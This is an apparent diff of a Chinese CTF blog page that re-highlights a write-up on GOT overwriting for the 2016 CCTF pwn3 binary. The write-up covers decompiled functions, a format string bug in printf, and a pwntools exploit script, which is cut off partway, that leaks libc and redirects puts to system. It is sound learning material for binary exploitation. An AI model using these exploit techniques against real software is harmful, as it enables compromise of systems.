@@ -28,7 +28,7 @@
     </style>
 
     <script src="/libs/jquery/jquery-2.2.0.min.js"></script>
-<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+<link rel="stylesheet" href="/css/prism-xonokai.css" type="text/css"></head>
 
 
 <body>
@@ -398,14 +398,14 @@
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        2.1k
+                        2k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        9 分
+                        8 分
                     </div>
                     
                 
@@ -429,195 +429,206 @@
 <li><p><strong>确定函数 B 的内存地址</strong><br>   这一步通常来说，需要我们自己想办法来泄露对应函数 B 的地址。</p>
 </li>
 <li><p><strong>将函数 B 的内存地址写入到函数 A 的 GOT 表地址处</strong></p>
-<p>   这一步一般来说需要我们利用函数的漏洞来进行触发。一般利用方法有如下3种</p>
-<pre><code>   写入函数：write 函数。
-
-   ROP</code></pre><pre><code>pop eax; ret;           # printf@got -&gt; eax
-pop ebx; ret;           # (addr_offset = system_addr - printf_addr) -&gt; ebx 函数间的偏移量
-add [eax] ebx; ret;     # [printf@got] = [printf@got] + addr_offset</code></pre><pre><code>  **格式化字符串任意地址写**</code></pre></li>
+</li>
 </ul>
-<h2 id="2：例子2016-CCTF-–-pwn3"><a href="#2：例子2016-CCTF-–-pwn3" class="headerlink" title="2：例子2016 CCTF – pwn3"></a>2：例子2016 CCTF – pwn3</h2><h3 id="checksec："><a href="#checksec：" class="headerlink" title="checksec："></a>checksec：</h3><pre><code>hunter@hunter:~/PWN/wiki/formal$ checksec pwn3
-[*] &#39;/home/hunter/PWN/wiki/formal/pwn3&#39;
-    Arch:     i386-32-little
-    RELRO:    Partial RELRO
-    Stack:    No canary found
-    NX:       NX enabled           #只开了NX
-    PIE:      No PIE (0x8048000)</code></pre><h3 id="IDA："><a href="#IDA：" class="headerlink" title="IDA："></a>IDA：</h3><p><img src="https://s1.ax1x.com/2020/07/17/U6yi26.png" alt=""><br>ask_username(&amp;s1)和ask_password(&amp;s1)函数可以很容易得出：要输入rxraclhm。<br>get_command()函数，就是输入get，put，dir然后会进入下面相应的函数，如果输入其他的直接退出程序<br>接下来隆重介绍以下函数：<br><strong>put_file（）函数</strong></p>
-<pre><code>_DWORD *put_file()
-{
-  _DWORD *v0; // ST1C_4     #v0是一个指针，其大小为DWORD4个字节
-  _DWORD *result; // eax
+<p>这一步一般来说需要我们利用函数的漏洞来进行触发。一般利用方法有如下3种</p>
+<blockquote>
+<p>写入函数：write 函数。</p>
+</blockquote>
+<blockquote>
+<p>ROP:<br>pop eax; ret;           # printf@got -&gt; eax<br>pop ebx; ret;           # (addr_offset = system_addr - printf_addr) -&gt; ebx 函数间的偏移量<br>add [eax] ebx; ret;     # [printf@got] = [printf@got] + addr_offset</p>
+</blockquote>
+<blockquote>
+<p>格式化字符串任意地址写</p>
+</blockquote>
+<h2 id="2：例子2016-CCTF-–-pwn3"><a href="#2：例子2016-CCTF-–-pwn3" class="headerlink" title="2：例子2016 CCTF – pwn3"></a>2：例子2016 CCTF – pwn3</h2><h3 id="checksec："><a href="#checksec：" class="headerlink" title="checksec："></a>checksec：</h3><pre class=" language-c"><code class="language-c">hunter@hunter<span class="token punctuation">:</span><span class="token operator">~</span><span class="token operator">/</span>PWN<span class="token operator">/</span>wiki<span class="token operator">/</span>formal$ checksec pwn3
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/wiki/formal/pwn3'</span>
+    Arch<span class="token punctuation">:</span>     i386<span class="token number">-32</span><span class="token operator">-</span>little
+    RELRO<span class="token punctuation">:</span>    Partial RELRO
+    Stack<span class="token punctuation">:</span>    No canary found
+    NX<span class="token punctuation">:</span>       NX enabled           #只开了NX
+    PIE<span class="token punctuation">:</span>      No <span class="token function">PIE</span> <span class="token punctuation">(</span><span class="token number">0x8048000</span><span class="token punctuation">)</span></code></pre>
+<h3 id="IDA："><a href="#IDA：" class="headerlink" title="IDA："></a>IDA：</h3><p><img src="https://s1.ax1x.com/2020/07/17/U6yi26.png" alt=""><br>ask_username(&amp;s1)和ask_password(&amp;s1)函数可以很容易得出：要输入rxraclhm。<br>get_command()函数，就是输入get，put，dir然后会进入下面相应的函数，如果输入其他的直接退出程序<br>接下来隆重介绍以下函数：<br><strong>put_file（）函数</strong></p>
+<pre class=" language-c"><code class="language-c">_DWORD <span class="token operator">*</span><span class="token function">put_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  _DWORD <span class="token operator">*</span>v0<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ST1C_4     #v0是一个指针，其大小为DWORD4个字节</span>
+  _DWORD <span class="token operator">*</span>result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>
 
-  v0 = malloc(244u);     #malloc函数开辟一个大小为244的堆区
-  printf(&quot;please enter the name of the file you want to upload:&quot;);
-  get_input((int)v0, 40, 1);    #get_input函数别有乾坤
-  printf(&quot;then, enter the content:&quot;);
-  get_input((int)(v0 + 10), 200, 1);
-  v0[60] = file_head;        #file_head是一个全局变量, BSS段
-  result = v0;
-  file_head = (int)v0;     #最后堆区的地址给到了file_head Bss段全局变量
-  return result;
-}
+  v0 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">244u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     #malloc函数开辟一个大小为<span class="token number">244</span>的堆区
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"please enter the name of the file you want to upload:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">get_input</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v0<span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    #get_input函数别有乾坤
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"then, enter the content:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">get_input</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v0 <span class="token operator">+</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  v0<span class="token punctuation">[</span><span class="token number">60</span><span class="token punctuation">]</span> <span class="token operator">=</span> file_head<span class="token punctuation">;</span>        #file_head是一个全局变量<span class="token punctuation">,</span> BSS段
+  result <span class="token operator">=</span> v0<span class="token punctuation">;</span>
+  file_head <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v0<span class="token punctuation">;</span>     #最后堆区的地址给到了file_head Bss段全局变量
+  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
 
 get_input函数    将堆区的地址v0传入即a1
-// a1是地址  a2是大小  a3是1
-signed int __cdecl get_input(int a1, int a2, int a3)
-{
-  signed int result; // eax
-  _BYTE *v4; // [esp+18h] [ebp-10h]
-  int v5; // [esp+1Ch] [ebp-Ch]
+<span class="token comment" spellcheck="true">// a1是地址  a2是大小  a3是1</span>
+<span class="token keyword">signed</span> <span class="token keyword">int</span> __cdecl <span class="token function">get_input</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">,</span> <span class="token keyword">int</span> a2<span class="token punctuation">,</span> <span class="token keyword">int</span> a3<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  <span class="token keyword">signed</span> <span class="token keyword">int</span> result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>
+  _BYTE <span class="token operator">*</span>v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+18h] [ebp-10h]</span>
+  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1Ch] [ebp-Ch]</span>
 
-  v5 = 0;
-  while ( 1 )
-  {
-    v4 = (_BYTE *)(v5 + a1);       
-    result = fread((void *)(v5 + a1), 1u, 1u, stdin);   #往a1里面读入字符，一次读一个whle循环
-    if ( result &lt;= 0 )
-      break;
-    if ( *v4 == 10 &amp;&amp; a3 )   *v4应该不会等于10，所以我觉都这个if语句完全不会执行，直接执行else
-    {
-      if ( v5 )
-      {
-        result = v5 + a1;
-        *v4 = 0;
-        return result;
-      }
-    }
-    else
-    {
-      result = ++v5;    
-      if ( v5 &gt;= a2 )     #控制输入量不会大于a2
-        return result;
-    }
-  }
-  return result;
-}</code></pre><p><strong>所以get_input大致作用是：标准输入中读入字符串，写入堆区v0。第一个get_input最多40个字节（字符），第二个从堆区(v0 + 10)开始因为v0是大小为4字节的指针，所以加10将</strong><br><strong>刚好从40个字节后开始填入字符串，最多读入200个：</strong><br><img src="https://s1.ax1x.com/2020/07/17/U6yP8x.png" alt=""></p>
+  v5 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>
+  <span class="token punctuation">{</span>
+    v4 <span class="token operator">=</span> <span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v5 <span class="token operator">+</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span>       
+    result <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v5 <span class="token operator">+</span> a1<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1u</span><span class="token punctuation">,</span> <span class="token number">1u</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   #往a1里面读入字符，一次读一个whle循环
+    <span class="token keyword">if</span> <span class="token punctuation">(</span> result <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token punctuation">)</span>
+      <span class="token keyword">break</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span>v4 <span class="token operator">==</span> <span class="token number">10</span> <span class="token operator">&amp;&amp;</span> a3 <span class="token punctuation">)</span>   <span class="token operator">*</span>v4应该不会等于<span class="token number">10</span>，所以我觉都这个<span class="token keyword">if</span>语句完全不会执行，直接执行<span class="token keyword">else</span>
+    <span class="token punctuation">{</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token punctuation">)</span>
+      <span class="token punctuation">{</span>
+        result <span class="token operator">=</span> v5 <span class="token operator">+</span> a1<span class="token punctuation">;</span>
+        <span class="token operator">*</span>v4 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> result<span class="token punctuation">;</span>
+      <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">else</span>
+    <span class="token punctuation">{</span>
+      result <span class="token operator">=</span> <span class="token operator">++</span>v5<span class="token punctuation">;</span>    
+      <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token operator">>=</span> a2 <span class="token punctuation">)</span>     #控制输入量不会大于a2
+        <span class="token keyword">return</span> result<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+  <span class="token punctuation">}</span>
+  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre>
+<p><strong>所以get_input大致作用是：标准输入中读入字符串，写入堆区v0。第一个get_input最多40个字节（字符），第二个从堆区(v0 + 10)开始因为v0是大小为4字节的指针，所以加10将</strong><br><strong>刚好从40个字节后开始填入字符串，最多读入200个：</strong><br><img src="https://s1.ax1x.com/2020/07/17/U6yP8x.png" alt=""></p>
 <p><strong>show_dir函数：</strong></p>
-<pre><code>int show_dir()
-{
-  int v0; // eax
-  char s[1024]; // [esp+14h] [ebp-414h]
-  int i; // [esp+414h] [ebp-14h]
-  int j; // [esp+418h] [ebp-10h]
-  int v5; // [esp+41Ch] [ebp-Ch]
+<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">show_dir</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  <span class="token keyword">int</span> v0<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>
+  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+14h] [ebp-414h]</span>
+  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+414h] [ebp-14h]</span>
+  <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+418h] [ebp-10h]</span>
+  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+41Ch] [ebp-Ch]</span>
 
-  v5 = 0;
-  j = 0;
-  bzero(s, 1024u);                              // 将s数组置零
-  for ( i = file_head; i; i = *(_DWORD *)(i + 240) )    #首先i被赋值file_head即堆区地址，发现中间i并没有判断，后面的i再次进行赋值
-  {
-    for ( j = 0; *(_BYTE *)(i + j); ++j )    #中间也没有明显的进行判断
-    {
-      v0 = v5++;
-      s[v0] = *(_BYTE *)(i + j);    #对s数组逐个赋值，从堆区地址开始
-    }
-  }
-  return puts(s);
-}</code></pre><blockquote>
+  v5 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+  j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+  <span class="token function">bzero</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">1024u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                              <span class="token comment" spellcheck="true">// 将s数组置零</span>
+  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> file_head<span class="token punctuation">;</span> i<span class="token punctuation">;</span> i <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">240</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    #首先i被赋值file_head即堆区地址，发现中间i并没有判断，后面的i再次进行赋值
+  <span class="token punctuation">{</span>
+    <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> j<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>    #中间也没有明显的进行判断
+    <span class="token punctuation">{</span>
+      v0 <span class="token operator">=</span> v5<span class="token operator">++</span><span class="token punctuation">;</span>
+      s<span class="token punctuation">[</span>v0<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> j<span class="token punctuation">)</span><span class="token punctuation">;</span>    #对s数组逐个赋值，从堆区地址开始
+    <span class="token punctuation">}</span>
+  <span class="token punctuation">}</span>
+  <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre>
+<blockquote>
 <p>第一个for循环：i先被赋予堆区地址，中间的表达式（即i）不为0，执行一次内部语句后，i又被堆区240个字节开始赋值，靠后的应该这个区域值为0，所以第一个for应该只会执行一次<br>第二个for循环：中间是直接对(i + j)地址解引用，即(i + j)地址上的字节，显然解引用到值为0的地址才会停。<br>最后是调用puts函数其参数就是经过赋值后的s。<br><img src="https://s1.ax1x.com/2020/07/17/U6yCP1.png" alt=""><br>那么如果我file_name很短，那就只会将fiel_name赋给s数组，然后输出s（什么名字40个字符这么长？？）。那么基本就可以确定puts的参数就是s即file_name</p>
 </blockquote>
 <p><strong>get_file函数：</strong></p>
-<pre><code>int get_file()
-{
-  char dest; // [esp+1Ch] [ebp-FCh]
-  char s1; // [esp+E4h] [ebp-34h]
-  char *i; // [esp+10Ch] [ebp-Ch]
+<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">get_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  <span class="token keyword">char</span> dest<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1Ch] [ebp-FCh]</span>
+  <span class="token keyword">char</span> s1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+E4h] [ebp-34h]</span>
+  <span class="token keyword">char</span> <span class="token operator">*</span>i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+10Ch] [ebp-Ch]</span>
 
-  printf(&quot;enter the file name you want to get:&quot;);
-  __isoc99_scanf(&quot;%40s&quot;, &amp;s1);   #显然这里不会存在溢出
-  if ( !strncmp(&amp;s1, &quot;flag&quot;, 4u) )    
-    puts(&quot;too young, too simple&quot;);
-  for ( i = (char *)file_head; i; i = (char *)*((_DWORD *)i + 60) )   #第一个是i被赋予堆区地址，第二个i显然不会为0，第三个将i转换为4字节指针后加60那其实
-                                                                        又是堆区240字节后的区域，将使i= 0 ，所以这个for也只执行一次
-  {
-    if ( !strcmp(i, &amp;s1) )                      // 堆区开头是file_name 所以输入对应的file_name到s1即可进入if
-    {
-      strcpy(&amp;dest, i + 40);                    // i+40地址处的是我们的content 
-      return printf(&amp;dest);
-    }
-  }
-  return printf(&amp;dest);
-}</code></pre><p>所以整个函数是你输入对应的file_name就输出对应的tontent（结合程序本身，伪码有些不一定准确），显然这个printf是存在格式化字符串漏洞的，但是它的参数是i+40即tontent的内容。</p>
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"enter the file name you want to get:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%40s"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>s1<span class="token punctuation">)</span><span class="token punctuation">;</span>   #显然这里不会存在溢出
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strncmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s1<span class="token punctuation">,</span> <span class="token string">"flag"</span><span class="token punctuation">,</span> <span class="token number">4u</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"too young, too simple"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>file_head<span class="token punctuation">;</span> i<span class="token punctuation">;</span> i <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>i <span class="token operator">+</span> <span class="token number">60</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>   #第一个是i被赋予堆区地址，第二个i显然不会为<span class="token number">0</span>，第三个将i转换为<span class="token number">4</span>字节指针后加<span class="token number">60</span>那其实
+                                                                        又是堆区<span class="token number">240</span>字节后的区域，将使i<span class="token operator">=</span> <span class="token number">0</span> ，所以这个<span class="token keyword">for</span>也只执行一次
+  <span class="token punctuation">{</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token operator">&amp;</span>s1<span class="token punctuation">)</span> <span class="token punctuation">)</span>                      <span class="token comment" spellcheck="true">// 堆区开头是file_name 所以输入对应的file_name到s1即可进入if</span>
+    <span class="token punctuation">{</span>
+      <span class="token function">strcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dest<span class="token punctuation">,</span> i <span class="token operator">+</span> <span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment" spellcheck="true">// i+40地址处的是我们的content </span>
+      <span class="token keyword">return</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dest<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+  <span class="token punctuation">}</span>
+  <span class="token keyword">return</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dest<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre>
+<p>所以整个函数是你输入对应的file_name就输出对应的tontent（结合程序本身，伪码有些不一定准确），显然这个printf是存在格式化字符串漏洞的，但是它的参数是i+40即tontent的内容。</p>
 <h3 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h3><p><strong>首先可以用这个漏洞泄露函数真实地址，从而得到libc版本。又ASLR没开，能漏洞改写函数got表上的地址，改成system地址。因为我们不能控制程序流程，只能靠跳转实现system（无法在栈上构造数据）。system函数只有一个参数，纵观程序中所有函数只有puts函数如此相像，我们想办法把puts的got表上的地址改为system地址，然后它的参数s内容搞成/bin/sh字符串即可。</strong></p>
 <blockquote>
 <p>确定格式化字符串参数偏移<br>利用 __libc_start_main_got 获取 put 函数地址，进而获取对应的 libc.so 的版本，进而获取对应 system 函数地址。<br>参数s就是我们的file_name<br>修改 puts@got 的内容为 system 的地址。<br>当程序再次执行 puts 函数的时候，其实执行的是 system 函数。</p>
 </blockquote>
 <h3 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h3><p>注意printf漏洞是在get_file函数中实现的，所以一定要记得调用get选项</p>
-<pre><code>from pwn import*
-from LibcSearcher import* 
-context.log_level = &#39;debug&#39;
-elf = ELF(&#39;pwn3&#39;)
-puts_got = elf.got[&#39;puts&#39;]
-main_start_got = elf.got[&#39;__libc_start_main&#39;]
-print hex(main_start_got)
-print hex(puts_got)
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>
+<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span><span class="token operator">*</span> 
+context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'pwn3'</span><span class="token punctuation">)</span>
+puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
+main_start_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span>
+<span class="token keyword">print</span> hex<span class="token punctuation">(</span>main_start_got<span class="token punctuation">)</span>
+<span class="token keyword">print</span> hex<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span>
 
-sh = process(&#39;./pwn3&#39;)
-print sh.recv()
-sh.sendline(&#39;rxraclhm&#39;)     #密码绕过
-print sh.recv()
+sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./pwn3'</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'rxraclhm'</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">#密码绕过</span>
+<span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
 
-sh.sendline(&#39;put&#39;)   #调用put函数
-print sh.recv()
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'put'</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#调用put函数</span>
+<span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
 
-name = &#39;/sh&#39;      #名字/sh
-sh.sendline(name)
-content = &#39;%8$s&#39; + p32(main_start_got)     #准备__libc_start_main地址的泄露
-sh.sendline(content)
-print sh.recv()
+name <span class="token operator">=</span> <span class="token string">'/sh'</span>      <span class="token comment" spellcheck="true">#名字/sh</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>name<span class="token punctuation">)</span>
+content <span class="token operator">=</span> <span class="token string">'%8$s'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>main_start_got<span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">#准备__libc_start_main地址的泄露</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span>
+<span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
 
-sh.sendline(&#39;get&#39;)    #调用get函数利用漏洞
-print sh.recv()
-#gdb.attach(sh)
-sh.sendline(&#39;/sh&#39;)    
-#print u32(sh.recv(4))
-main_start_addr = u32(sh.recv(4))   #得到地址
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'get'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#调用get函数利用漏洞</span>
+<span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#gdb.attach(sh)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'/sh'</span><span class="token punctuation">)</span>    
+<span class="token comment" spellcheck="true">#print u32(sh.recv(4))</span>
+main_start_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#得到地址</span>
 
-libc = LibcSearcher(&#39;__libc_start_main&#39;,main_start_addr)   #得到libc版本
-libc_addr = main_start_addr - libc.dump(&#39;__libc_start_main&#39;)
-print hex(libc_addr)
-system_addr = libc_addr + libc.dump(&#39;system&#39;)
-binsh_addr = libc_addr + libc.dump(&#39;str_bin_sh&#39;)
-print hex(system_addr)
-print hex(binsh_addr)
+libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">,</span>main_start_addr<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#得到libc版本</span>
+libc_addr <span class="token operator">=</span> main_start_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span> hex<span class="token punctuation">(</span>libc_addr<span class="token punctuation">)</span>
+system_addr <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>
+binsh_addr <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span> hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>
+<span class="token keyword">print</span> hex<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span>
 
-sh.sendline(&#39;dir&#39;)   
-sh.recv()
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'dir'</span><span class="token punctuation">)</span>   
+sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
 
 
-sh.sendline(&#39;put&#39;)    #调用put函数
-print sh.recv()
-sh.sendline(&#39;/bin&#39;)    #名字/bin
-payload = fmtstr_payload(7,{puts_got:system_addr})    #准备将system地址写入puts_got
-print payload
-#gdb.attach(sh)
-sh.sendline(payload)
-print sh.recv()
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'put'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#调用put函数</span>
+<span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'/bin'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#名字/bin</span>
+payload <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token punctuation">{</span>puts_got<span class="token punctuation">:</span>system_addr<span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#准备将system地址写入puts_got</span>
+<span class="token keyword">print</span> payload
+<span class="token comment" spellcheck="true">#gdb.attach(sh)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+<span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
 
-sh.sendline(&#39;get&#39;)   #调用get函数利用漏洞
-sh.recv()
-sh.sendline(&#39;/bin&#39;)  
-print sh.recv()
